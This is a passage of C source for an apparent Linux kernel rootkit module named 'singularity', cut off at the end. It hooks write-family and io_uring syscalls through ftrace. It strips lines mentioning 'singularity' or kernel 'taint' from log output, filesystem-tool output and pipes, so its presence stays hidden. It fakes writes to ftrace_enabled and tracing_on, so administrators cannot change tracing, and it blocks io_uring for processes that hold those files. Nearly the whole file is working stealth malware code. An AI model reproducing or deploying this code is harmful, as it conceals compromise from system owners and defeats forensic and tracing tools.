#include "../include/core.h"
#include "../include/hooks_write.h"
#include "../ftrace/ftrace_helper.h"

#define BUF_SIZE 4096

char saved_ftrace_value[64] = "1\n";
EXPORT_SYMBOL(saved_ftrace_value);

bool ftrace_write_intercepted = false;
EXPORT_SYMBOL(ftrace_write_intercepted);

static asmlinkage ssize_t (*original_write)(const struct pt_regs *);
static asmlinkage ssize_t (*original_write32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_writev)(const struct pt_regs *);
static asmlinkage ssize_t (*original_writev32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_pwrite64)(const struct pt_regs *);
static asmlinkage ssize_t (*original_pwrite64_ia32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_pwritev)(const struct pt_regs *);
static asmlinkage ssize_t (*original_pwritev2)(const struct pt_regs *);
static asmlinkage ssize_t (*original_pwritev_ia32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_pwritev2_ia32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_sendfile)(const struct pt_regs *);
static asmlinkage ssize_t (*original_sendfile64)(const struct pt_regs *);
static asmlinkage ssize_t (*original_sendfile_ia32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_sendfile64_ia32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_compat_sendfile)(const struct pt_regs *);
static asmlinkage ssize_t (*original_compat_sendfile64)(const struct pt_regs *);
static asmlinkage ssize_t (*original_copy_file_range)(const struct pt_regs *);
static asmlinkage ssize_t (*original_copy_file_range_ia32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_splice)(const struct pt_regs *);
static asmlinkage ssize_t (*original_splice_ia32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_vmsplice)(const struct pt_regs *);
static asmlinkage ssize_t (*original_vmsplice_ia32)(const struct pt_regs *);
static asmlinkage ssize_t (*original_tee)(const struct pt_regs *);
static asmlinkage ssize_t (*original_tee_ia32)(const struct pt_regs *);
static asmlinkage long (*original_io_uring_enter)(const struct pt_regs *);
static asmlinkage long (*original_io_uring_enter2)(const struct pt_regs *);

static notrace void *memmem_k(const void *haystack, size_t hlen,
                               const void *needle, size_t nlen)
{
    const unsigned char *h = haystack;
    const unsigned char *n = needle;
    size_t i, j;
    
    if (nlen == 0 || nlen > hlen)
        return NULL;
    
    for (i = 0; i <= hlen - nlen; i++) {
        for (j = 0; j < nlen; j++) {
            if (h[i + j] != n[j])
                break;
        }
        if (j == nlen)
            return (void *)(h + i);
    }
    return NULL;
}

static notrace void *memmem_ci(const void *haystack, size_t hlen,
                                const void *needle, size_t nlen)
{
    const unsigned char *h = haystack;
    const unsigned char *n = needle;
    size_t i, j;
    
    if (nlen == 0 || nlen > hlen)
        return NULL;
    
    for (i = 0; i <= hlen - nlen; i++) {
        for (j = 0; j < nlen; j++) {
            unsigned char hc = h[i + j];
            unsigned char nc = n[j];
            if (hc >= 'A' && hc <= 'Z') hc += 32;
            if (nc >= 'A' && nc <= 'Z') nc += 32;
            if (hc != nc)
                break;
        }
        if (j == nlen)
            return (void *)(h + i);
    }
    return NULL;
}

static notrace bool buffer_has_taint(const char *buf, size_t len)
{
    if (!buf || len == 0)
        return false;
    return memmem_ci(buf, len, "taint", 5) != NULL;
}

static notrace bool buffer_has_singularity(const char *buf, size_t len)
{
    if (!buf || len == 0)
        return false;
    return memmem_ci(buf, len, "singularity", 11) != NULL;
}

static notrace bool process_has_block_device_open(void)
{
    struct files_struct *files;
    struct fdtable *fdt;
    struct file *file;
    unsigned int i;
    bool has_blkdev = false;
    unsigned long flags;
    struct inode *inode;

    files = current->files;
    if (!files)
        return false;

    spin_lock_irqsave(&files->file_lock, flags);
    
    fdt = files_fdtable(files);
    if (!fdt) {
        spin_unlock_irqrestore(&files->file_lock, flags);
        return false;
    }
    
    for (i = 0; i < fdt->max_fds && i < 256; i++) {
        file = fdt->fd[i];
        if (!file)
            continue;
        
        if (!file->f_path.dentry)
            continue;
            
        inode = file->f_path.dentry->d_inode;
        if (!inode)
            continue;
        
        if (S_ISBLK(inode->i_mode)) {
            has_blkdev = true;
            break;
        }
    }
    
    spin_unlock_irqrestore(&files->file_lock, flags);
    return has_blkdev;
}

static notrace bool fd_is_pipe(int fd)
{
    struct file *file;
    struct inode *inode;
    bool is_pipe = false;
    
    file = fget(fd);
    if (!file)
        return false;
    
    if (file->f_path.dentry) {
        inode = file->f_path.dentry->d_inode;
        if (inode && S_ISFIFO(inode->i_mode))
            is_pipe = true;
    }
    
    fput(file);
    return is_pipe;
}

static notrace bool is_fs_tool_output(const char *buf, size_t len)
{
    if (memmem_k(buf, len, "debugfs:", 8))
        return true;
    
    if (len > 10) {
        size_t i = 0;
        int spaces = 0;
        int digits = 0;
        
        while (i < len && buf[i] == ' ') {
            spaces++;
            i++;
        }
        
        while (i < len && buf[i] >= '0' && buf[i] <= '9') {
            digits++;
            i++;
        }
        
        if (digits >= 1 && spaces >= 1) {
            if (memmem_k(buf, len, "(", 1) && memmem_k(buf, len, ")", 1))
                return true;
        }
    }
    
    if (memmem_k(buf, len, "Inode count:", 12))
        return true;
    if (memmem_k(buf, len, "Block count:", 12))
        return true;
    if (memmem_k(buf, len, "Filesystem volume name:", 23))
        return true;
    if (memmem_k(buf, len, "Filesystem UUID:", 16))
        return true;
    if (memmem_k(buf, len, "e2fsck", 6))
        return true;
    if (memmem_k(buf, len, "Inode:", 6))
        return true;
    
    return false;
}

static notrace bool is_kernel_log_output(const char *buf, size_t len)
{
    if (len < 50)
        return false;
    
    if (memmem_k(buf, len, "[    ", 5) || memmem_k(buf, len, "[ ", 2)) {
        if (memmem_k(buf, len, "] ", 2))
            return true;
    }
    
    if (memmem_k(buf, len, "kernel:", 7))
        return true;
    
    if (memmem_k(buf, len, " kernel:", 8))
        return true;
    
    return false;
}

static notrace void sanitize_fs_tool_buffer_inplace(char *buf, size_t len)
{
    const size_t pattern_len = 11;
    char *ptr;
    size_t remaining;
    void *found;
    
    if (!buf || len < pattern_len)
        return;
    
    ptr = buf;
    remaining = len;
    
    while (remaining >= pattern_len) {
        found = memmem_ci(ptr, remaining, "singularity", pattern_len);
        if (!found)
            break;
        
        memset(found, ' ', pattern_len);
        
        ptr = (char *)found + pattern_len;
        remaining = len - (ptr - buf);
    }
}

static notrace ssize_t filter_singularity_lines(char *buf, size_t len)
{
    char *out;
    size_t out_len = 0;
    size_t i = 0;
    
    if (!buf || len == 0)
        return 0;
    
    out = kmalloc(len, GFP_ATOMIC);
    if (!out)
        return len;
    
    while (i < len) {
        size_t line_start = i;
        size_t line_end;
        size_t line_len;
        bool skip_line = false;
        
        while (i < len && buf[i] != '\n')
            i++;
        
        if (i < len && buf[i] == '\n')
            i++;
        
        line_end = i;
        line_len = line_end - line_start;
        
        if (buffer_has_singularity(buf + line_start, line_len))
            skip_line = true;
        
        if (!skip_line && line_len > 0) {
            memcpy(out + out_len, buf + line_start, line_len);
            out_len += line_len;
        }
    }
    
    if (out_len > 0)
        memcpy(buf, out, out_len);
    
    kfree(out);
    return out_len;
}

static notrace ssize_t filter_taint_lines(char *buf, size_t len)
{
    char *out;
    size_t out_len = 0;
    size_t i = 0;
    
    if (!buf || len == 0)
        return 0;
    
    out = kmalloc(len, GFP_ATOMIC);
    if (!out)
        return len;
    
    while (i < len) {
        size_t line_start = i;
        size_t line_end;
        size_t line_len;
        bool skip_line = false;
        
        while (i < len && buf[i] != '\n')
            i++;
        
        if (i < len && buf[i] == '\n')
            i++;
        
        line_end = i;
        line_len = line_end - line_start;
        
        if (buffer_has_taint(buf + line_start, line_len))
            skip_line = true;
        
        if (!skip_line && line_len > 0) {
            memcpy(out + out_len, buf + line_start, line_len);
            out_len += line_len;
        }
    }
    
    if (out_len > 0)
        memcpy(buf, out, out_len);
    
    kfree(out);
    return out_len;
}

static notrace bool is_real_ftrace_enabled(struct file *file)
{
    const char *name = NULL;
    struct dentry *dentry;
    struct super_block *sb;
    struct dentry *parent;
    
    if (!file || !file->f_path.dentry)
        return false;
    
    dentry = file->f_path.dentry;
    
    if (dentry->d_name.name)
        name = dentry->d_name.name;
    
    if (!name || strcmp(name, "ftrace_enabled") != 0)
        return false;
    
    if (!file->f_path.mnt || !file->f_path.mnt->mnt_sb)
        return false;
    
    sb = file->f_path.mnt->mnt_sb;
    
    if (!sb->s_type || !sb->s_type->name)
        return false;
    
    if (strcmp(sb->s_type->name, "proc") != 0 && 
        strcmp(sb->s_type->name, "sysfs") != 0)
        return false;
    
    parent = dentry->d_parent;
    if (!parent || !parent->d_name.name)
        return false;
    
    if (strcmp(parent->d_name.name, "kernel") != 0)
        return false;
    
    parent = parent->d_parent;
    if (!parent || !parent->d_name.name)
        return false;
    
    if (strcmp(parent->d_name.name, "sys") != 0)
        return false;
    
    return true;
}

static notrace bool is_real_tracing_on(struct file *file)
{
    const char *name = NULL;
    struct dentry *dentry;
    struct super_block *sb;
    
    if (!file || !file->f_path.dentry)
        return false;
    
    dentry = file->f_path.dentry;
    
    if (dentry->d_name.name)
        name = dentry->d_name.name;
    
    if (!name || strcmp(name, "tracing_on") != 0)
        return false;
    
    if (!file->f_path.mnt || !file->f_path.mnt->mnt_sb)
        return false;
    
    sb = file->f_path.mnt->mnt_sb;
    
    if (!sb->s_type || !sb->s_type->name)
        return false;
    
    if (strcmp(sb->s_type->name, "tracefs") != 0 && 
        strcmp(sb->s_type->name, "debugfs") != 0)
        return false;
    
    return true;
}

static notrace asmlinkage ssize_t hooked_write_ftrace(const struct pt_regs *regs,
                                                     asmlinkage ssize_t (*orig)(const struct pt_regs *),
                                                     bool compat32)
{
    int fd;
    const char __user *user_buf;
    size_t count;
    struct file *file;
    char *kernel_buf = NULL;
    size_t len;
    size_t i, start, end;
    long parsed_value;
    int ret;
    ssize_t result = -EINVAL;
    loff_t pos;

    if (!orig || !regs)
        return -EINVAL;

    if (!compat32) {
        fd       = regs->di;
        user_buf = (const char __user *)regs->si;
        count    = regs->dx;
    } else {
        fd       = regs->bx;
        user_buf = (const char __user *)regs->cx;
        count    = regs->dx;
    }

    file = fget(fd);
    if (!file)
        return orig(regs);

    pos = file->f_pos;

    if (pos == 0)
        ftrace_write_intercepted = false;

    if (count == 0) {
        fput(file);
        return -EINVAL;
    }

    kernel_buf = kmalloc(BUF_SIZE, GFP_KERNEL);
    if (!kernel_buf) {
        fput(file);
        return -ENOMEM;
    }

    if (copy_from_user(kernel_buf, user_buf, min(count, (size_t)BUF_SIZE))) {
        result = -EFAULT;
        goto out;
    }

    len = min(count, (size_t)BUF_SIZE - 1);
    kernel_buf[len] = '\0';

    for (i = 0; i < len; i++) {
        char c = kernel_buf[i];
        
        if ((c >= '0' && c <= '9') ||
            (c >= 'a' && c <= 'f') ||
            (c >= 'A' && c <= 'F') ||
            c == 'x' || c == 'X' ||
            c == '-' ||
            c == ' ' || c == '\t' ||
            c == '\n' || c == '\r' || 
            c == '\f' || c == '\v' ||
            c == '\0') {
            continue;
        }
        
        result = -EINVAL;
        goto out;
    }

    start = 0;
    while (start < len && (kernel_buf[start] == '\0' || 
                           kernel_buf[start] == ' ' || 
                           kernel_buf[start] == '\t' ||
                           kernel_buf[start] == '\f' ||
                           kernel_buf[start] == '\v'))
        start++;

    if (start >= len) {
        file->f_pos += count;
        result = count;
        goto out;
    }

    if (pos != 0) {
        if (!ftrace_write_intercepted) {
            result = -EINVAL;
            goto out;
        } else {
            file->f_pos += count;
            result = count;
            goto out;
        }
    }

    end = start;
    while (end < len && 
           kernel_buf[end] != '\n' && 
           kernel_buf[end] != '\0' &&
           kernel_buf[end] != ' ' &&
           kernel_buf[end] != '\r' &&
           kernel_buf[end] != '\t')
        end++;

    if (end == start) {
        result = -EINVAL;
        goto out;
    }

    if (kernel_buf[start] == '+') {
        result = -EINVAL;
        goto out;
    }

    if ((end - start) > 20) {
        result = -EINVAL;
        goto out;
    }

    kernel_buf[end] = '\0';

    ret = kstrtol(kernel_buf + start, 0, &parsed_value);
    if (ret != 0) {
        result = -EINVAL;
        goto out;
    }

    if (parsed_value > INT_MAX || parsed_value < INT_MIN) {
        result = -EINVAL;
        goto out;
    }

    i = snprintf(saved_ftrace_value, sizeof(saved_ftrace_value), "%ld\n", parsed_value);
    if (i >= sizeof(saved_ftrace_value))
        saved_ftrace_value[sizeof(saved_ftrace_value) - 1] = '\0';

    ftrace_write_intercepted = true;
    file->f_pos += count;
    result = count;

out:
    kfree(kernel_buf);
    fput(file);
    return result;
}

static notrace asmlinkage ssize_t hooked_write(const struct pt_regs *regs)
{
    int fd;
    char __user *user_buf;
    size_t count;
    struct file *file;
    char *kernel_buf = NULL;
    ssize_t filtered_len;
    ssize_t ret;
    bool needs_taint_filter;
    bool needs_singularity_filter;
    bool is_fs_tool;
    bool is_pipe;
    size_t original_count;

    if (!regs)
        return -EINVAL;

    fd = (int)regs->di;
    user_buf = (char __user *)regs->si;
    count = (size_t)regs->dx;
    original_count = count;

    file = fget(fd);
    if (file) {
        bool is_ftrace = is_real_ftrace_enabled(file);
        bool is_tracing = is_real_tracing_on(file);
        fput(file);
        
        if (is_ftrace || is_tracing) {
            return hooked_write_ftrace(regs, original_write, false);
        }
    }

    if (count == 0 || count > (2 * 1024 * 1024) || fd < 1)
        return original_write(regs);

    kernel_buf = kvmalloc(count + 1, GFP_KERNEL);
    if (!kernel_buf)
        return original_write(regs);

    if (copy_from_user(kernel_buf, user_buf, count)) {
        kvfree(kernel_buf);
        return original_write(regs);
    }
    kernel_buf[count] = '\0';

    is_fs_tool = process_has_block_device_open() || is_fs_tool_output(kernel_buf, count);
    is_pipe = fd_is_pipe(fd);

    needs_taint_filter = buffer_has_taint(kernel_buf, count) && 
                         is_kernel_log_output(kernel_buf, count);
    needs_singularity_filter = buffer_has_singularity(kernel_buf, count) &&
                               (is_fs_tool || is_pipe);

    if (!needs_taint_filter && !needs_singularity_filter) {
        kvfree(kernel_buf);
        return original_write(regs);
    }

    if (needs_singularity_filter && is_fs_tool && !is_pipe) {
        sanitize_fs_tool_buffer_inplace(kernel_buf, count);
        
        if (copy_to_user(user_buf, kernel_buf, count)) {
            kvfree(kernel_buf);
            return original_write(regs);
        }
        
        kvfree(kernel_buf);
        return original_write(regs);
    }

    if (needs_singularity_filter && is_pipe) {
        filtered_len = filter_singularity_lines(kernel_buf, count);
        
        if (filtered_len == 0) {
            kvfree(kernel_buf);
            return original_count;
        }
        
        count = filtered_len;
    }

    if (needs_taint_filter) {
        filtered_len = filter_taint_lines(kernel_buf, count);
        
        if (filtered_len == 0) {
            kvfree(kernel_buf);
            return original_count;
        }
    } else {
        filtered_len = count;
    }

    if (copy_to_user(user_buf, kernel_buf, filtered_len)) {
        kvfree(kernel_buf);
        return original_write(regs);
    }

    kvfree(kernel_buf);

    {
        struct pt_regs modified_regs = *regs;
        modified_regs.dx = filtered_len;
        ret = original_write(&modified_regs);
    }

    return (ret > 0) ? (ssize_t)original_count : ret;
}

static notrace asmlinkage ssize_t hooked_write32(const struct pt_regs *regs)
{
    int fd;
    char __user *user_buf;
    size_t count;
    struct file *file;
    char *kernel_buf = NULL;
    ssize_t filtered_len;
    ssize_t ret;
    bool needs_taint_filter;
    bool needs_singularity_filter;
    bool is_fs_tool;
    bool is_pipe;
    size_t original_count;

    if (!regs)
        return -EINVAL;

    fd = (int)regs->bx;
    user_buf = (char __user *)regs->cx;
    count = (size_t)regs->dx;
    original_count = count;

    file = fget(fd);
    if (file) {
        bool is_ftrace = is_real_ftrace_enabled(file);
        bool is_tracing = is_real_tracing_on(file);
        fput(file);
        
        if (is_ftrace || is_tracing) {
            return hooked_write_ftrace(regs, original_write32, true);
        }
    }

    if (count == 0 || count > (2 * 1024 * 1024) || fd < 1)
        return original_write32(regs);

    kernel_buf = kvmalloc(count + 1, GFP_KERNEL);
    if (!kernel_buf)
        return original_write32(regs);

    if (copy_from_user(kernel_buf, user_buf, count)) {
        kvfree(kernel_buf);
        return original_write32(regs);
    }
    kernel_buf[count] = '\0';

    is_fs_tool = process_has_block_device_open() || is_fs_tool_output(kernel_buf, count);
    is_pipe = fd_is_pipe(fd);

    needs_taint_filter = buffer_has_taint(kernel_buf, count) && 
                         is_kernel_log_output(kernel_buf, count);
    needs_singularity_filter = buffer_has_singularity(kernel_buf, count) &&
                               (is_fs_tool || is_pipe);

    if (!needs_taint_filter && !needs_singularity_filter) {
        kvfree(kernel_buf);
        return original_write32(regs);
    }

    if (needs_singularity_filter && is_fs_tool && !is_pipe) {
        sanitize_fs_tool_buffer_inplace(kernel_buf, count);
        
        if (copy_to_user(user_buf, kernel_buf, count)) {
            kvfree(kernel_buf);
            return original_write32(regs);
        }
        
        kvfree(kernel_buf);
        return original_write32(regs);
    }

    if (needs_singularity_filter && is_pipe) {
        filtered_len = filter_singularity_lines(kernel_buf, count);
        
        if (filtered_len == 0) {
            kvfree(kernel_buf);
            return original_count;
        }
        
        count = filtered_len;
    }

    if (needs_taint_filter) {
        filtered_len = filter_taint_lines(kernel_buf, count);
        
        if (filtered_len == 0) {
            kvfree(kernel_buf);
            return original_count;
        }
    } else {
        filtered_len = count;
    }

    if (copy_to_user(user_buf, kernel_buf, filtered_len)) {
        kvfree(kernel_buf);
        return original_write32(regs);
    }

    kvfree(kernel_buf);

    {
        struct pt_regs modified_regs = *regs;
        modified_regs.dx = filtered_len;
        ret = original_write32(&modified_regs);
    }

    return (ret > 0) ? (ssize_t)original_count : ret;
}

static notrace asmlinkage ssize_t hooked_pwrite64(const struct pt_regs *regs)
{
    int fd;
    struct file *file;

    if (!regs)
        return -EINVAL;

    fd = (int)regs->di;
    file = fget(fd);
    if (file) {
        bool is_ftrace = is_real_ftrace_enabled(file);
        bool is_tracing = is_real_tracing_on(file);
        fput(file);
        
        if (is_ftrace || is_tracing) {
            return hooked_write_ftrace(regs, original_pwrite64, false);
        }
    }

    return original_pwrite64(regs);
}

static notrace asmlinkage ssize_t hooked_pwrite64_ia32(const struct pt_regs *regs)
{
    int fd;
    struct file *file;

    if (!regs)
        return -EINVAL;

    fd = (int)regs->bx;
    file = fget(fd);
    if (file) {
        bool is_ftrace = is_real_ftrace_enabled(file);
        bool is_tracing = is_real_tracing_on(file);
        fput(file);
        
        if (is_ftrace || is_tracing) {
            return hooked_write_ftrace(regs, original_pwrite64_ia32, true);
        }
    }

    return original_pwrite64_ia32(regs);
}

static notrace asmlinkage ssize_t hooked_writev_common(const struct pt_regs *regs,
                                                      asmlinkage ssize_t (*orig)(const struct pt_regs *),
                                                      bool compat32)
{
    int fd;
    const struct iovec __user *vec;
    unsigned long vlen;
    struct file *file;

    if (!orig || !regs)
        return -EINVAL;

    if (!compat32) {
        fd   = regs->di;
        vec  = (const struct iovec __user *)regs->si;
        vlen = regs->dx;
    } else {
        fd   = regs->bx;
        vec  = (const struct iovec __user *)regs->cx;
        vlen = regs->dx;
    }

    file = fget(fd);
    if (!file)
        return orig(regs);

    if (is_real_ftrace_enabled(file) || is_real_tracing_on(file)) {
        fput(file);
        return vlen;
    }

    fput(file);
    return orig(regs);
}

static notrace asmlinkage ssize_t hooked_writev(const struct pt_regs *regs)
{
    return hooked_writev_common(regs, original_writev, false);
}

static notrace asmlinkage ssize_t hooked_writev32(const struct pt_regs *regs)
{
    return hooked_writev_common(regs, original_writev32, true);
}

static notrace asmlinkage ssize_t hooked_pwritev(const struct pt_regs *regs)
{
    return hooked_writev_common(regs, original_pwritev, false);
}

static notrace asmlinkage ssize_t hooked_pwritev2(const struct pt_regs *regs)
{
    return hooked_writev_common(regs, original_pwritev2, false);
}

static notrace asmlinkage ssize_t hooked_pwritev_ia32(const struct pt_regs *regs)
{
    return hooked_writev_common(regs, original_pwritev_ia32, true);
}

static notrace asmlinkage ssize_t hooked_pwritev2_ia32(const struct pt_regs *regs)
{
    return hooked_writev_common(regs, original_pwritev2_ia32, true);
}

static notrace asmlinkage ssize_t hooked_fd_transfer_common(const struct pt_regs *regs,
                                                            asmlinkage ssize_t (*orig)(const struct pt_regs *),
                                                            bool compat32)
{
    int out_fd;
    size_t count;
    struct file *out_file;

    if (!orig || !regs)
        return -EINVAL;

    if (!compat32) {
        out_fd = regs->di;
        count  = regs->r10;
    } else {
        out_fd = regs->bx;
        count  = regs->si;
    }

    out_file = fget(out_fd);
    if (!out_file)
        return orig(regs);

    if (is_real_ftrace_enabled(out_file) || is_real_tracing_on(out_file)) {
        fput(out_file);
        return count;
    }

    fput(out_file);
    return orig(regs);
}

static notrace asmlinkage ssize_t hooked_sendfile(const struct pt_regs *regs)
{
    return hooked_fd_transfer_common(regs, original_sendfile, false);
}

static notrace asmlinkage ssize_t hooked_sendfile64(const struct pt_regs *regs)
{
    return hooked_fd_transfer_common(regs, original_sendfile64, false);
}

static notrace asmlinkage ssize_t hooked_sendfile_ia32(const struct pt_regs *regs)
{
    return hooked_fd_transfer_common(regs, original_sendfile_ia32, true);
}

static notrace asmlinkage ssize_t hooked_sendfile64_ia32(const struct pt_regs *regs)
{
    return hooked_fd_transfer_common(regs, original_sendfile64_ia32, true);
}

static notrace asmlinkage ssize_t hooked_compat_sendfile(const struct pt_regs *regs)
{
    return hooked_fd_transfer_common(regs, original_compat_sendfile, true);
}

static notrace asmlinkage ssize_t hooked_compat_sendfile64(const struct pt_regs *regs)
{
    return hooked_fd_transfer_common(regs, original_compat_sendfile64, true);
}

static notrace asmlinkage ssize_t hooked_copy_file_range_common(const struct pt_regs *regs,
                                                                asmlinkage ssize_t (*orig)(const struct pt_regs *),
                                                                bool compat32)
{
    int fd_out;
    size_t count;
    struct file *out_file;

    if (!orig || !regs)
        return -EINVAL;

    if (!compat32) {
        fd_out = regs->r10;
        count  = regs->r8;
    } else {
        fd_out = regs->si;
        count  = regs->r8;
    }

    out_file = fget(fd_out);
    if (!out_file)
        return orig(regs);

    if (is_real_ftrace_enabled(out_file) || is_real_tracing_on(out_file)) {
        fput(out_file);
        return count;
    }

    fput(out_file);
    return orig(regs);
}

static notrace asmlinkage ssize_t hooked_copy_file_range(const struct pt_regs *regs)
{
    return hooked_copy_file_range_common(regs, original_copy_file_range, false);
}

static notrace asmlinkage ssize_t hooked_copy_file_range_ia32(const struct pt_regs *regs)
{
    return hooked_copy_file_range_common(regs, original_copy_file_range_ia32, true);
}

static notrace asmlinkage ssize_t hooked_splice_common(const struct pt_regs *regs,
                                                       asmlinkage ssize_t (*orig)(const struct pt_regs *),
                                                       bool compat32)
{
    int fd_out;
    size_t count;
    struct file *out_file;

    if (!orig || !regs)
        return -EINVAL;

    if (!compat32) {
        fd_out = regs->dx;
        count  = regs->r10;
    } else {
        fd_out = regs->dx;
        count  = regs->si;
    }

    out_file = fget(fd_out);
    if (!out_file)
        return orig(regs);

    if (is_real_ftrace_enabled(out_file) || is_real_tracing_on(out_file)) {
        fput(out_file);
        return count;
    }

    fput(out_file);
    return orig(regs);
}

static notrace asmlinkage ssize_t hooked_splice(const struct pt_regs *regs)
{
    return hooked_splice_common(regs, original_splice, false);
}

static notrace asmlinkage ssize_t hooked_splice_ia32(const struct pt_regs *regs)
{
    return hooked_splice_common(regs, original_splice_ia32, true);
}

static notrace asmlinkage ssize_t hooked_vmsplice_common(const struct pt_regs *regs,
                                                         asmlinkage ssize_t (*orig)(const struct pt_regs *),
                                                         bool compat32)
{
    int fd;
    unsigned long nr_segs;
    struct file *file;

    if (!orig || !regs)
        return -EINVAL;

    if (!compat32) {
        fd      = regs->di;
        nr_segs = regs->dx;
    } else {
        fd      = regs->bx;
        nr_segs = regs->dx;
    }

    file = fget(fd);
    if (!file)
        return orig(regs);

    if (is_real_ftrace_enabled(file) || is_real_tracing_on(file)) {
        fput(file);
        return nr_segs;
    }

    fput(file);
    return orig(regs);
}

static notrace asmlinkage ssize_t hooked_vmsplice(const struct pt_regs *regs)
{
    return hooked_vmsplice_common(regs, original_vmsplice, false);
}

static notrace asmlinkage ssize_t hooked_vmsplice_ia32(const struct pt_regs *regs)
{
    return hooked_vmsplice_common(regs, original_vmsplice_ia32, true);
}

static notrace asmlinkage ssize_t hooked_tee_common(const struct pt_regs *regs,
                                                    asmlinkage ssize_t (*orig)(const struct pt_regs *),
                                                    bool compat32)
{
    int fd_out;
    size_t count;
    struct file *out_file;

    if (!orig || !regs)
        return -EINVAL;

    if (!compat32) {
        fd_out = regs->si;
        count  = regs->dx;
    } else {
        fd_out = regs->cx;
        count  = regs->dx;
    }

    out_file = fget(fd_out);
    if (!out_file)
        return orig(regs);

    if (is_real_ftrace_enabled(out_file) || is_real_tracing_on(out_file)) {
        fput(out_file);
        return count;
    }

    fput(out_file);
    return orig(regs);
}

static notrace asmlinkage ssize_t hooked_tee(const struct pt_regs *regs)
{
    return hooked_tee_common(regs, original_tee, false);
}

static notrace asmlinkage ssize_t hooked_tee_ia32(const struct pt_regs *regs)
{
    return hooked_tee_common(regs, original_tee_ia32, true);
}

static DEFINE_SPINLOCK(cache_lock);
static pid_t last_blocked_pid = 0;
static unsigned long last_check_jiffies = 0;

static bool process_has_protected_fd(void)
{
    struct files_struct *files;
    struct fdtable *fdt;
    struct file *file;
    unsigned int i;
    bool has_protected = false;
    unsigned long flags;

    files = current->files;
    if (!files)
        return false;

    spin_lock_irqsave(&files->file_lock, flags);
    
    fdt = files_fdtable(files);
    if (!fdt) {
        spin_unlock_irqrestore(&files->file_lock, flags);
        return false;
    }
    
    for (i = 0; i < fdt->max_fds; i++) {
        file = fdt->fd[i];
        if (file) {
            if (is_real_ftrace_enabled(file) || is_real_tracing_on(file)) {
                has_protected = true;
                break;
            }
        }
    }
    
    spin_unlock_irqrestore(&files->file_lock, flags);
    return has_protected;
}

static notrace asmlinkage long hooked_io_uring_enter(const struct pt_regs *regs)
{
    pid_t current_pid;
    bool should_block = false;
    unsigned long cache_flags;

    if (!regs || !original_io_uring_enter)
        return -EINVAL;

    current_pid = current->pid;

    spin_lock_irqsave(&cache_lock, cache_flags);
    if (current_pid == last_blocked_pid && 
        time_before(jiffies, last_check_jiffies + HZ)) {
        should_block = true;
        spin_unlock_irqrestore(&cache_lock, cache_flags);
    } else {
        spin_unlock_irqrestore(&cache_lock, cache_flags);
        
        should_block = process_has_protected_fd();
        
        if (should_block) {
            spin_lock_irqsave(&cache_lock, cache_flags);
            last_blocked_pid = current_pid;
            last_check_jiffies = jiffies;
            spin_unlock_irqrestore(&cache_lock, cache_flags);
        }
    }

    if (should_block)
        return -EINVAL;

    return original_io_uring_enter(regs);
}

static notrace asmlinkage long hooked_io_uring_enter_ia32(const struct pt_regs *regs)
{
    unsigned int uring_fd;
    unsigned int to_submit;
    unsigned int min_complete;
    unsigned int flags_param;
    pid_t current_pid;
    bool should_block = false;
    unsigned long cache_flags;

    if (!regs)
        return -EINVAL;
    
    if (!original_io_uring_enter2)
        return -EINVAL;

    uring_fd = regs->bx;
    to_submit = regs->cx;
    min_complete = regs->dx;
    flags_param = regs->si;
    current_pid = current->pid;

    spin_lock_irqsave(&cache_lock, cache_flags);
    if (current_pid == last_blocked_pid && 
        time_before(jiffies, last_check_jiffies + HZ)) {
        should_block = true;
        spin_unlock_irqrestore(&cache_lock, cache_flags);
    } else {
        spin_unlock_irqrestore(&cache_lock, cache_flags);
        
        should_block = process_has_protected_fd();
        
        if (should_block) {
            spin_lock_irqsave(&cache_lock, cache_flags);
            last_blocked_pid = current_pid;
            last_check_jiffies = jiffies;
            spin_unlock_irqrestore(&cache_lock, cache_flags);
        }
    }

    if (should_block)
        return -EINVAL;

    return original_io_uring_enter2(regs);
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_write",   hooked_write,   &original_write),
    HOOK("__ia32_sys_write",  hooked_write32, &original_write32),
    HOOK("__x64_sys_writev",  hooked_writev,  &original_writev),
    HOOK("__ia32_sys_writev", hooked_writev32, &original_writev32),

    HOOK("__x64_sys_pwrite64", hooked_pwrite64, &original_pwrite64),
    HOOK("__x64_sys_ia32_pwrite64", hooked_pwrite64_ia32, &original_pwrite64_ia32),

    HOOK("__x64_sys_pwritev", hooked_pwritev, &original_pwritev),
    HOOK("__x64_sys_pwritev2", hooked_pwritev2, &original_pwritev2),
    HOOK("__ia32_sys_pwritev", hooked_pwritev_ia32, &original_pwritev_ia32),
    HOOK("__ia32_sys_pwritev2", hooked_pwritev2_ia32, &original_pwritev2_ia32),

    HOOK("__x64_sys_sendfile", hooked_sendfile, &original_sendfile),
    HOOK("__x64_sys_sendfile64", hooked_sendfile64, &original_sendfile64),
    HOOK("__ia32_sys_sendfile", hooked_sendfile_ia32, &original_sendfile_ia32),
    HOOK("__ia32_sys_sendfile64", hooked_sendfile64_ia32, &original_sendfile64_ia32),
    HOOK("__ia32_compat_sys_sendfile", hooked_compat_sendfile, &original_compat_sendfile),
    HOOK("__ia32_compat_sys_sendfile64", hooked_compat_sendfile64, &original_compat_sendfile64),

    HOOK("__x64_sys_copy_file_range", hooked_copy_file_range, &original_copy_file_range),
    HOOK("__ia32_sys_copy_file_range", hooked_copy_file_range_ia32, &original_copy_file_range_ia32),

    HOOK("__x64_sys_splice", hooked_splice, &original_splice),
    HOOK("__ia32_sys_splice", hooked_splice_ia32, &original_splice_ia32),

    HOOK("__x64_sys_vmsplice", hooked_vmsplice, &original_vmsplice),
    HOOK("__ia32_sys_vmsplice", hooked_vmsplice_ia32, &original_vmsplice_ia32),

    HOOK("__x64_sys_tee", hooked_tee, &original_tee),
    HOOK("__ia32_sys_tee", hooked_tee_ia32, &original_tee_ia32),
    HOOK("__x64_sys_io_uring_enter", hooked_io_uring_enter, &original_io_uring_enter),
    HOOK("__ia32_sys_io_uring_enter", hooked_io_uring_enter, &original_io_uring_enter2),
};

notrace int hooks_write_init(void)
{
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

notrace void hooks_write_exit(void)
{
    unsigned long flags;
    
